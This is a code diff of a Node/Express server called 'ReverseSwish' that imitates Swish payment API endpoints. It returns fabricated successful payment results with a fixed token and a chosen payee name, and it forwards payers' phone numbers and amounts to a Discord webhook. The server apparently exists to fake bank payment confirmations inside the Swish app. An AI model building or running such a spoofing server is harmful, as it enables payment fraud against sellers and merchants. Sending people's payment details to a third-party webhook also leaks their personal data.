@@ -7,7 +7,8 @@ const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/125295503175031194
 
 app.use(express.json());
 
-let paymentDataStore = [];
+let MSID = ""
+let AMOUNT = ""
 
 app.get("/", (req, res) => {
   res.send("ReverseSwish is running! 🚀");
@@ -39,7 +40,8 @@ app.use((req, res, next) => {
 app.post("/mpc-swish/api/v4/initiatepayment", (req, res) => {
   try {
     const { amount, msisdnPayee, currency } = req.body;
-    paymentDataStore.push({ amount, msisdnPayee, currency });
+    AMOUNT = amount;
+    MSID = msisdnPayee;
     sendDiscordWebhook(`New Payment Received: ${amount} ${currency} from ${msisdnPayee}`);
     res.status(200).json({
       autoStartToken: "0336631d-8a76-46a1-8b3a-f7b0f69aa257",
@@ -92,24 +94,29 @@ app.post("/mpc-swish/api/v3/executeactivation/", (req, res) => {
 });
 
 app.post("/mpc-swish/api/v3/executepayment/:param1/:param2", (req, res) => {
+  try {
+    // Extract data from request body
+   
 
-  const latestPayment = paymentDataStore[1];
+    // Construct response JSON
+    const responseJson = {
+      result: "200",
+      amount: AMOUNT,
+      currency: "SEK",
+      message: "", // Assuming no specific message for this example
+      timestamp: null, // Assuming no timestamp for this example
+      bankPaymentReference: null, // Assuming no bank payment reference for this example
+      payeeName: "DOG",
+      payeeBusinessName: null, // Assuming no business name for this example
+      payeeAlias: MSID
+    };
 
-  const responseData = {
-    result: "200",
-    amount: latestPayment.amount,
-    currency: latestPayment.currency,
-    message: "",
-    timestamp: null,
-    bankPaymentReference: null,
-    payeeName: "Lunar",
-    payeeBusinessName: null,
-    payeeAlias: param2
-  };
-  sendDiscordWebhook(responseData);
-
-  res.status(200).send(responseData);
-
+    // Send response
+    res.status(200).json(responseJson);
+  } catch (error) {
+    console.error('Error handling payment:', error);
+    res.status(500).json({ error: 'Internal Server Error' });
+  }
 });
 
 // Badgecount Endpoints
